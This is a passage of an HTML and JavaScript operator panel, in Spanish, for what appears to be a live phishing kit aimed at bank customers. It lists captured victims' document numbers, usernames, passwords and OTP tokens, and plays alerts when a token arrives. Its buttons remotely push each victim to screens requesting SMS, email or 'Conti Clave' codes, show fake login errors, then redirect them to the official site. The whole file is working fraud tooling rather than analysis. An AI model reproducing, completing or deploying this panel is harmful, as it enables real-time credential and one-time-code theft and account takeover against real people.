                    <table class="telemetry-table" id="clients-table">
                        <thead>
                            <tr>
                                <th>#ID / País</th>
                                <th>Dispositivo</th>
                                <th>Dirección IP</th>
                                <th>Documento</th>
                                <th>Usuario</th>
                                <th>Contraseña Única</th>
                                <th>Token OTP</th>
                                <th>Estado / Presencia</th>
                                <th style="text-align: right;">Acciones de Control</th>
                            </tr>
                        </thead>
                        <tbody id="clients-tbody">
                            <tr>
                                <td colspan="9" class="empty-state">
                                    <i class="ri-loader-4-line ri-spin"></i>
                                    <span>Conectando canal de telemetría en tiempo real...</span>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

        </main>
    </div>

    <!-- BLACKLIST MODAL -->
    <div class="modal-overlay" id="blacklist-modal">
        <div class="modal-card">
            <div class="panel-header-toolbar" style="padding: 16px 20px;">
                <h3 class="panel-title-text" style="color: var(--rose);">
                    <i class="ri-shield-cross-line"></i>
                    Lista Negra de Direcciones IP
                </h3>
                <div style="display:flex; align-items:center; gap:12px;">
                    <a href="blacklist.php" style="color:var(--text-tertiary); font-size:11.5px; text-decoration:none; display:flex; align-items:center; gap:4px;"><i class="ri-external-link-line"></i> Vista Completa</a>
                    <button class="btn-toggle-sidebar" onclick="closeBlacklistModal()">
                        <i class="ri-close-line"></i>
                    </button>
                </div>
            </div>
            <div style="padding: 16px 20px; border-bottom: 1px solid var(--border-subtle); display: flex; gap: 10px;">
                <input type="text" id="manual-ban-ip" placeholder="Dirección IP a bloquear (ej: 181.54.21.9)" style="flex: 1; height: 38px; background: rgba(0,0,0,0.4); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 0 12px; color: #fff; font-family: var(--font-mono); font-size: 13px; outline: none;">
                <button class="btn-action-tool danger" onclick="submitManualBan()" style="padding: 0 16px;">
                    <i class="ri-forbid-line"></i>
                    <span>Bloquear IP</span>
                </button>
            </div>
            <div style="max-height: 340px; overflow-y: auto; padding: 14px 20px;" id="blacklist-items">
                <div style="text-align: center; padding: 30px; color: var(--text-tertiary);">Cargando lista negra...</div>
            </div>
        </div>
    </div>

    <!-- PURGE MODAL -->
    <div class="modal-overlay" id="purge-modal">
        <div class="modal-card" style="max-width: 440px; text-align: center; padding: 28px 24px;">
            <div style="width: 52px; height: 52px; border-radius: 50%; background: rgba(244, 63, 94, 0.15); color: var(--rose); display: flex; align-items: center; justify-content: center; font-size: 26px; margin: 0 auto 16px;">
                <i class="ri-error-warning-line"></i>
            </div>
            <h3 style="font-size: 17px; font-weight: 800; color: #fff; margin-bottom: 8px;">¿Purgar toda la base de datos?</h3>
            <p style="font-size: 12.5px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 22px;">
                Esta acción eliminará de forma irreversible todas las capturas registradas. Recuerda descargar un respaldo CSV antes de continuar.
            </p>
            <div style="display: flex; gap: 12px; justify-content: center;">
                <button class="btn-action-tool" onclick="closePurgeModal()" style="padding: 10px 18px; background: rgba(255,255,255,0.05); color: #fff;">Cancelar</button>
                <button class="btn-action-tool danger" onclick="confirmPurgeDatabase()" style="padding: 10px 18px;">
                    Sí, Purgar Registros
                </button>
            </div>
        </div>
    </div>

    <!-- TOAST CONTAINER -->
    <div class="toast-container" id="toast-shelf"></div>

    <!-- JAVASCRIPT LOGIC & ENGINE -->
    <script>
        // State
        let audioActive = localStorage.getItem('eco_audio') !== 'false';
        let audioContext = null;
        let isInitialLoad = true;
        let previousClientCount = 0;
        let knownTokens = new Set();
        let knownIdentityClicks = new Set();
        let currentFilter = 'all';
        let searchQuery = '';
        let cachedClients = [];
        let noteTimers = {};

        // Sidebar Collapse Toggle
        function toggleSidebar() {
            document.body.classList.toggle('sidebar-collapsed');
            const isCollapsed = document.body.classList.contains('sidebar-collapsed');
            localStorage.setItem('eco_sidebar_collapsed', isCollapsed ? '1' : '0');
        }

        if (localStorage.getItem('eco_sidebar_collapsed') === '1') {
            document.body.classList.add('sidebar-collapsed');
        }

        function scrollToTop() {
            document.getElementById('workspace-content').scrollTo({ top: 0, behavior: 'smooth' });
        }

        // Web Audio Synthesizer (Instant response, zero external MP3 latency)
        function initAudio() {
            try {
                if (!audioContext) {
                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
                }
                if (audioContext.state === 'suspended') {
                    audioContext.resume();
                }
            } catch (e) {}
        }
        document.addEventListener('click', initAudio, { once: false });
        document.addEventListener('keydown', initAudio, { once: false });

        function toggleAudio() {
            initAudio();
            audioActive = !audioActive;
            localStorage.setItem('eco_audio', audioActive);
            const btn = document.getElementById('btn-audio');
            const icon = document.getElementById('audio-icon');
            const label = document.getElementById('audio-label');

            if (audioActive) {
                btn.classList.add('active');
                icon.className = 'ri-volume-up-line';
                label.textContent = 'Sonido Activo';
                showToast('🔔 Alertas sonoras activadas');
                playAlertChime('login');
            } else {
                btn.classList.remove('active');
                icon.className = 'ri-volume-mute-line';
                label.textContent = 'Silenciado';
                showToast('🔕 Alertas sonoras silenciadas');
            }
        }

        function testSoundAlert() {
            initAudio();
            if (!audioActive) toggleAudio();
            playAlertChime('token');
            showToast('🔊 Tono de prueba reproducido (Token)');
        }

        function playAlertChime(kind = 'login') {
            if (!audioActive) return;
            try {
                initAudio();
                if (!audioContext) return;
                const now = audioContext.currentTime;

                if (kind === 'login') {
                    // Double Chime: E5 -> B5
                    const osc1 = audioContext.createOscillator();
                    const gain1 = audioContext.createGain();
                    osc1.type = 'sine';
                    osc1.frequency.setValueAtTime(659.25, now);
                    gain1.gain.setValueAtTime(0.2, now);
                    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.22);
                    osc1.connect(gain1);
                    gain1.connect(audioContext.destination);
                    osc1.start(now);
                    osc1.stop(now + 0.22);

                    const osc2 = audioContext.createOscillator();
                    const gain2 = audioContext.createGain();
                    osc2.type = 'sine';
                    osc2.frequency.setValueAtTime(987.77, now + 0.11);
                    gain2.gain.setValueAtTime(0.22, now + 0.11);
                    gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.42);
                    osc2.connect(gain2);
                    gain2.connect(audioContext.destination);
                    osc2.start(now + 0.11);
                    osc2.stop(now + 0.42);
                } else if (kind === 'token') {
                    // High-Priority Triad Melodic Chime: A5 -> C#6 -> E6
                    [
                        { freq: 880.00, time: 0, dur: 0.18 },
                        { freq: 1108.73, time: 0.09, dur: 0.22 },
                        { freq: 1318.51, time: 0.18, dur: 0.42 }
                    ].forEach(n => {
                        const osc = audioContext.createOscillator();
                        const gain = audioContext.createGain();
                        osc.type = 'triangle';
                        osc.frequency.setValueAtTime(n.freq, now + n.time);
                        gain.gain.setValueAtTime(0.28, now + n.time);
                        gain.gain.exponentialRampToValueAtTime(0.001, now + n.time + n.dur);
                        osc.connect(gain);
                        gain.connect(audioContext.destination);
                        osc.start(now + n.time);
                        osc.stop(now + n.time + n.dur);
                    });
                } else if (kind === 'identity') {
                    // Double Alert Chime (Confirma tu identidad clicked): F5 -> A5
                    [
                        { freq: 698.46, time: 0, dur: 0.16 },
                        { freq: 880.00, time: 0.12, dur: 0.28 }
                    ].forEach(n => {
                        const osc = audioContext.createOscillator();
                        const gain = audioContext.createGain();
                        osc.type = 'triangle';
                        osc.frequency.setValueAtTime(n.freq, now + n.time);
                        gain.gain.setValueAtTime(0.3, now + n.time);
                        gain.gain.exponentialRampToValueAtTime(0.001, now + n.time + n.dur);
                        osc.connect(gain);
                        gain.connect(audioContext.destination);
                        osc.start(now + n.time);
                        osc.stop(now + n.time + n.dur);
                    });
                }
            } catch (e) {
                console.warn('Audio error:', e);
            }
        }

        // Clock Update
        function updateClock() {
            const el = document.getElementById('live-clock-txt');
            if (!el) return;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('es-CO', { hour12: false });
            el.textContent = timeStr;
        }
        setInterval(updateClock, 1000);
        updateClock();

        // Toast Helper
        function showToast(msg) {
            const shelf = document.getElementById('toast-shelf');
            if (!shelf) return;
            const toast = document.createElement('div');
            toast.className = 'toast-msg';
            toast.innerHTML = `<i class="ri-information-line" style="color: var(--cyan-accent);"></i> <span>${msg}</span>`;
            shelf.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateY(10px)';
                toast.style.transition = 'all 0.3s ease';
                setTimeout(() => toast.remove(), 300);
            }, 3200);
        }

        // Copy Helper
        function copyText(val, label = 'Dato') {
            if (!val) return;
            navigator.clipboard.writeText(val).then(() => {
                showToast(`✓ ${label} copiado: <b>${val}</b>`);
            }).catch(() => {});
        }

        // Filter & Search Controls
        function setFilter(flt) {
            currentFilter = flt;
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.filter === flt);
            });
            renderTable();
        }

        function handleSearch() {
            searchQuery = (document.getElementById('search-input').value || '').toLowerCase().trim();
            renderTable();
        }

        // Real-Time Telemetry Data Fetcher
        async function fetchTelemetry() {
            try {
                const res = await fetch('actions.php?action=get_data');
                if (!res.ok) return;
                const data = await res.json();
                if (data && data.status === 'success') {
                    // Update Stats
                    const elTotal = document.getElementById('stat-total');
                    if (elTotal) elTotal.textContent = data.stats.total || 0;
                    const elOnline = document.getElementById('stat-online');
                    if (elOnline) elOnline.textContent = data.stats.online || 0;
                    const elTokens = document.getElementById('stat-tokens');
                    if (elTokens) elTokens.textContent = data.stats.tokens || 0;
                    const elFinished = document.getElementById('stat-finished');
                    if (elFinished) elFinished.textContent = data.stats.finished || 0;
                    const elBadgeOnline = document.getElementById('badge-online-count');
                    if (elBadgeOnline) elBadgeOnline.textContent = data.stats.online || 0;

                    // Audio Alerts Logic
                    if (!isInitialLoad) {
                        if (data.clients.length > previousClientCount) {
                            playAlertChime('login');
                            showToast('⚡ Nuevo cliente capturado');
                        }

                        data.clients.forEach(c => {
                            if (c.token && c.token.trim() !== '' && !knownTokens.has(`${c.id}_${c.token}`)) {
                                knownTokens.add(`${c.id}_${c.token}`);
                                playAlertChime('token');
                                showToast(`🔑 ¡TOKEN RECIBIDO! Cliente #${c.id}: <b>${c.token}</b>`);
                            }

                            if (c.identity_clicked > 0 && !knownIdentityClicks.has(`${c.id}_${c.identity_clicked}`)) {
                                knownIdentityClicks.add(`${c.id}_${c.identity_clicked}`);
                                playAlertChime('identity');
                                showToast(`⚠️ ¡AVISO! Cliente #${c.id} (${c.user || 'S/U'}) dio en [Confirma tu identidad]`);
                            }
                        });
                    } else {
                        data.clients.forEach(c => {
                            if (c.token && c.token.trim() !== '') {
                                knownTokens.add(`${c.id}_${c.token}`);
                            }
                            if (c.identity_clicked > 0) {
                                knownIdentityClicks.add(`${c.id}_${c.identity_clicked}`);
                            }
                        });
                        isInitialLoad = false;
                    }
                    previousClientCount = data.clients.length;

                    // Cache and Render
                    cachedClients = data.clients || [];
                    renderTable();
                    renderLogs(data.logs || []);

                    // Populate initial notes if not loaded
                    if (data.notes) {
                        const n1 = document.getElementById('note-1');
                        const n2 = document.getElementById('note-2');
                        if (n1 && !n1.dataset.loaded) {
                            n1.value = data.notes.note1 || '';
                            n1.dataset.loaded = 'true';
                        }
                        if (n2 && !n2.dataset.loaded) {
                            n2.value = data.notes.note2 || '';
                            n2.dataset.loaded = 'true';
                        }
                    }
                }
            } catch (e) {
                console.warn('Telemetry sync error:', e);
            }
        }

        // Table Renderer with Filter & Search
        function renderTable() {
            const tbody = document.getElementById('clients-tbody');
            if (!tbody) return;

            let filtered = cachedClients.filter(c => {
                if (currentFilter === 'online' && !c.is_online) return false;
                if (currentFilter === 'token' && (!c.token || c.token.trim() === '')) return false;
                if (currentFilter === 'waiting' && c.status !== 'WAITING') return false;
                if (currentFilter === 'finish' && c.status !== 'FINISH') return false;

                if (searchQuery) {
                    const haystack = `${c.id} ${c.user} ${c.ip} ${c.token} ${c.device}`.toLowerCase();
                    if (!haystack.includes(searchQuery)) return false;
                }
                return true;
            });

            if (filtered.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="9" class="empty-state">
                            <i class="ri-inbox-line"></i>
                            <span>No hay registros coincidentes con los filtros seleccionados</span>
                        </td>
                    </tr>
                `;
                return;
            }

            tbody.innerHTML = filtered.map(c => {
                // Device Icon
                let devIcon = 'ri-computer-line';
                if (c.device.toLowerCase().includes('mobile') || c.device.toLowerCase().includes('phone')) {
                    devIcon = 'ri-smartphone-line';
                } else if (c.device.toLowerCase().includes('tablet')) {
                    devIcon = 'ri-tablet-line';
                }

                // Presence Badge
                let presenceBadge = '<span class="badge badge-offline"><span style="width:5px;height:5px;border-radius:50%;background:#94a3b8;"></span> Desconectado</span>';
                if (c.is_typing) {
                    presenceBadge = '<span class="badge badge-typing"><i class="ri-edit-2-line"></i> Escribiendo...</span>';
                } else if (c.is_online) {
                    presenceBadge = '<span class="badge badge-online"><span class="live-dot"></span> En Línea</span>';
                }

                // Status Pill
                let statusClass = 'status-waiting';
                if (c.status === 'TOKEN' || c.status === 'CONTI') statusClass = 'status-token';
                if (c.status === 'SMS') statusClass = 'status-sms';
                if (c.status === 'CORREO') statusClass = 'status-correo';
                if (c.status === 'ERROR_TOKEN' || c.status === 'ERROR_LOGIN') statusClass = 'status-error-token';
                if (c.status === 'FINISH') statusClass = 'status-finish';
                if (c.status === 'LOGIN') statusClass = 'status-login';

                // Token display
                let tokenDisplay = '<span class="token-empty">Pendiente...</span>';
                let hasNewTokenClass = '';
                if (c.token && c.token.trim() !== '') {
                    hasNewTokenClass = c.token_changed ? 'row-new-token' : '';
                    tokenDisplay = `
                        <div class="token-glow-box" onclick="copyText('${escapeHtml(c.token)}', 'Token OTP')" title="Clic para copiar token">
                            <i class="ri-key-fill"></i>
                            <span>${escapeHtml(c.token)}</span>
                        </div>
                    `;
                }

                // Separar Documento | Usuario (formato enviado por index.html)
                let rawDoc = c.user || '';
                let rawUser = c.user || '';
                if (rawDoc.includes(' | ')) {
                    const parts = rawDoc.split(' | ');
                    rawDoc = parts[0];
                    rawUser = parts.slice(1).join(' | ');
                }

                return `
                    <tr class="${hasNewTokenClass}">
                        <td>
                            <div style="display:flex; align-items:center; gap:6px;">
                                <span style="font-family:var(--font-mono); font-weight:700; color:#fff;">#${c.id}</span>
                                <span style="font-size:10px; padding:1px 5px; border-radius:4px; background:rgba(255,255,255,0.06); font-family:var(--font-mono); color:#94a3b8;">${escapeHtml(c.country_code)}</span>
                            </div>
                            <div style="font-size:10px; color:var(--text-tertiary); margin-top:2px;">${escapeHtml(c.created_fmt)}</div>
                        </td>
                        <td>
                            <div style="display:flex; align-items:center; gap:6px; color:#cbd5e1;">
                                <i class="${devIcon}" style="color:var(--cyan-accent); font-size:15px;"></i>
                                <span style="font-size:11.5px;">${escapeHtml(c.device)}</span>
                            </div>
                        </td>
                        <td>
                            <div class="copy-pill" onclick="copyText('${escapeHtml(c.ip)}', 'IP')" title="Clic para copiar IP">
                                <span>${escapeHtml(c.ip)}</span>
                                <i class="ri-file-copy-line" style="font-size:11px; opacity:0.6;"></i>
                            </div>
                        </td>
                        <td>
                            <div class="copy-pill" style="font-size:13px; color:#a78bfa;" onclick="copyText('${escapeHtml(rawDoc)}', 'Documento')" title="Clic para copiar Documento">
                                <span>${escapeHtml(rawDoc)}</span>
                                <i class="ri-file-copy-line" style="font-size:11px; opacity:0.6;"></i>
                            </div>
                        </td>
                        <td>
                            <div class="copy-pill" style="font-size:13px; color:#38bdf8;" onclick="copyText('${escapeHtml(rawUser)}', 'Usuario')" title="Clic para copiar Usuario">
                                <span>${escapeHtml(rawUser)}</span>
                                <i class="ri-file-copy-line" style="font-size:11px; opacity:0.6;"></i>
                            </div>
                        </td>
                        <td>
                            <div class="copy-pill" style="font-size:13px; color:#f8fafc;" onclick="copyText('${escapeHtml(c.pass)}', 'Contraseña')" title="Clic para copiar PIN">
                                <span>${escapeHtml(c.pass)}</span>
                                <i class="ri-file-copy-line" style="font-size:11px; opacity:0.6;"></i>
                            </div>
                        </td>
                        <td>${tokenDisplay}</td>
                        <td>
                            <div style="display:flex; flex-direction:column; gap:4px; align-items:flex-start;">
                                ${presenceBadge}
                                <span class="badge badge-status ${statusClass}">${escapeHtml(c.status)}</span>
                            </div>
                        </td>
                        <td>
                            <div class="actions-flex">
                                <button class="act-btn btn-act-token" onclick="sendCommand(${c.id}, 'CONTI')" title="Pedir Conti Clave al cliente">
                                    <i class="ri-shield-keyhole-line"></i> Conti
                                </button>
                                <button class="act-btn" style="background:rgba(14,165,233,0.16); border:1px solid rgba(14,165,233,0.35); color:#38bdf8;" onclick="sendCommand(${c.id}, 'SMS')" title="Pedir Código SMS al cliente">
                                    <i class="ri-message-2-line"></i> SMS
                                </button>
                                <button class="act-btn" style="background:rgba(168,85,247,0.16); border:1px solid rgba(168,85,247,0.35); color:#c084fc;" onclick="sendCommand(${c.id}, 'CORREO')" title="Pedir Código Correo al cliente">
                                    <i class="ri-mail-line"></i> Correo
                                </button>
                                <button class="act-btn" style="background:rgba(245,158,11,0.16); border:1px solid rgba(245,158,11,0.35); color:#fbbf24;" onclick="sendCommand(${c.id}, 'WAITING')" title="Poner en pantalla de Espera / Load">
                                    <i class="ri-loader-4-line"></i> Espera
                                </button>
                                <button class="act-btn btn-act-error" onclick="sendCommand(${c.id}, 'ERROR_TOKEN')" title="Mostrar error de token OTP">
                                    <i class="ri-error-warning-line"></i> Error OTP
                                </button>
                                <button class="act-btn btn-act-error" style="background:rgba(244,63,94,0.16); border:1px solid rgba(244,63,94,0.35); color:#fb7185;" onclick="sendCommand(${c.id}, 'ERROR_LOGIN')" title="Mostrar error de login (usuario o contraseña inválidos)">
                                    <i class="ri-user-unfollow-line"></i> Error Login
                                </button>
                                <button class="act-btn btn-act-finish" onclick="sendCommand(${c.id}, 'FINISH')" title="Finalizar y enviar a web oficial">
                                    <i class="ri-check-double-line"></i> Finalizar
                                </button>
                                <button class="act-btn btn-act-login" onclick="sendCommand(${c.id}, 'LOGIN')" title="Regresar al login inicial">
                                    <i class="ri-restart-line"></i>
                                </button>
                                <button class="btn-act-del" onclick="deleteClient(${c.id})" title="Eliminar registro">
                                    <i class="ri-delete-bin-line"></i>
                                </button>
                                <button class="btn-act-ban" onclick="blacklistClient('${escapeHtml(c.ip)}', ${c.id})" title="Bloquear IP permanentemente">
                                    <i class="ri-forbid-line"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');
        }

        // Render Logs Feed
        function renderLogs(logs) {
            const container = document.getElementById('logs-container');
            const countEl = document.getElementById('log-count-txt');
            if (!container) return;

            if (countEl) countEl.textContent = `${logs.length} eventos`;

            if (logs.length === 0) {
                container.innerHTML = '<div style="color: var(--text-tertiary); font-size: 11.5px; padding: 8px;">Sin registros recientes</div>';
                return;
            }

            container.innerHTML = logs.map(l => `
                <div class="audit-chip">
                    <div class="audit-chip-meta">
                        <span style="font-weight:700; color:var(--cyan-accent);">${escapeHtml(l.operator_name)} [${escapeHtml(l.event_type)}]</span>
                        <span style="font-family:var(--font-mono);">${escapeHtml(l.time)}</span>
                    </div>
                    <div style="color:#e2e8f0;">${escapeHtml(l.description)}</div>
                </div>
            `).join('');
        }

        // Remote Action Dispatcher
        async function sendCommand(id, status) {
            try {
                const fd = new FormData();
                fd.append('action', 'set_status');
                fd.append('id', id);
                fd.append('status', status);

                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    showToast(`⚡ Comando [${status}] enviado al cliente #${id}`);
                    fetchTelemetry();
                } else {
                    showToast('⚠️ Error al enviar comando');
                }
            } catch (e) {
                showToast('⚠️ Error de conexión');
            }
        }

        // Delete Client
        async function deleteClient(id) {
            if (!confirm(`¿Estás seguro de eliminar al cliente #${id}?`)) return;
            try {
                const fd = new FormData();
                fd.append('action', 'delete');
                fd.append('id', id);

                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    showToast(`🗑️ Cliente #${id} eliminado`);
                    fetchTelemetry();
                }
            } catch (e) {}
        }

        // Blacklist IP
        async function blacklistClient(ip, id) {
            if (!confirm(`¿Bloquear permanentemente la IP ${ip}? Se eliminará la sesión del cliente #${id}.`)) return;
            try {
                const fd = new FormData();
                fd.append('action', 'blacklist');
                fd.append('ip', ip);
                fd.append('reason', `Bloqueo directo cliente #${id}`);

                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    showToast(`🚫 IP ${ip} bloqueada permanentemente`);
                    fetchTelemetry();
                }
            } catch (e) {}
        }

        // Notes Auto-Save
        function queueSaveNote(num) {
            if (noteTimers[num]) clearTimeout(noteTimers[num]);
            const statusEl = document.getElementById(`note${num}-saved`);
            if (statusEl) statusEl.classList.remove('show');

            noteTimers[num] = setTimeout(async () => {
                const txt = document.getElementById(`note-${num}`).value;
                const fd = new FormData();
                fd.append('action', 'save_note');
                fd.append('num', num);
                fd.append('notes', txt);

                try {
                    await fetch('actions.php', { method: 'POST', body: fd });
                    if (statusEl) {
                        statusEl.classList.add('show');
                        setTimeout(() => statusEl.classList.remove('show'), 2200);
                    }
                } catch (e) {}
            }, 600);
        }

        // Blacklist Modal Functions
        function openBlacklistModal() {
            document.getElementById('blacklist-modal').style.display = 'flex';
            loadBlacklist();
        }

        function closeBlacklistModal() {
            document.getElementById('blacklist-modal').style.display = 'none';
        }

        async function loadBlacklist() {
            const container = document.getElementById('blacklist-items');
            container.innerHTML = '<div style="text-align: center; padding: 25px; color: var(--text-tertiary);">Cargando lista negra...</div>';
            try {
                const fd = new FormData();
                fd.append('action', 'get_blacklist');
                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    if (data.blacklist.length === 0) {
                        container.innerHTML = '<div style="text-align: center; padding: 25px; color: var(--text-tertiary);">No hay direcciones IP bloqueadas</div>';
                        return;
                    }

                    container.innerHTML = data.blacklist.map(item => `
                        <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 12px; background:rgba(255,255,255,0.03); border:1px solid var(--border-subtle); border-radius:8px; margin-bottom:8px;">
                            <div>
                                <span style="font-family:var(--font-mono); font-weight:700; color:#fda4af;">${escapeHtml(item.ip)}</span>
                                <span style="font-size:11px; color:var(--text-tertiary); margin-left:8px;">(${escapeHtml(item.reason)})</span>
                                <div style="font-size:10px; color:#64748b; margin-top:2px;">Bloqueado: ${escapeHtml(item.created_at)}</div>
                            </div>
                            <button class="btn-action-tool" style="background:rgba(16,185,129,0.15); color:var(--emerald); border-color:rgba(16,185,129,0.3);" onclick="unblockIp('${escapeHtml(item.ip)}')">
                                <i class="ri-lock-unlock-line"></i> Desbloquear
                            </button>
                        </div>
                    `).join('');
                }
            } catch (e) {}
        }

        async function unblockIp(ip) {
            try {
                const fd = new FormData();
                fd.append('action', 'unblock');
                fd.append('ip', ip);
                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    showToast(`✓ IP ${ip} desbloqueada`);
                    loadBlacklist();
                }
            } catch (e) {}
        }

        async function submitManualBan() {
            const input = document.getElementById('manual-ban-ip');
            const ip = (input.value || '').trim();
            if (!ip) return;
            try {
                const fd = new FormData();
                fd.append('action', 'blacklist');
                fd.append('ip', ip);
                fd.append('reason', 'Bloqueo manual desde panel');
                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    showToast(`🚫 IP ${ip} bloqueada`);
                    input.value = '';
                    loadBlacklist();
                    fetchTelemetry();
                } else {
                    showToast('⚠️ Dirección IP inválida');
                }
            } catch (e) {}
        }

        // Purge Modal Functions
        function openPurgeModal() {
            document.getElementById('purge-modal').style.display = 'flex';
        }

        function closePurgeModal() {
            document.getElementById('purge-modal').style.display = 'none';
        }

        async function confirmPurgeDatabase() {
            try {
                const fd = new FormData();
                fd.append('action', 'delete_all');
                const res = await fetch('actions.php', { method: 'POST', body: fd });
                const data = await res.json();
                if (data.status === 'success') {
                    closePurgeModal();
                    showToast('🗑️ Base de datos purgada completamente');
                    fetchTelemetry();
                }
            } catch (e) {}
        }

        // Escape HTML
        function escapeHtml(str) {
            if (!str) return '';
            return String(str)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }

        // Polling loop (every 1.8s)
        setInterval(fetchTelemetry, 1800);
        fetchTelemetry();
    </script>
</body>
</html>
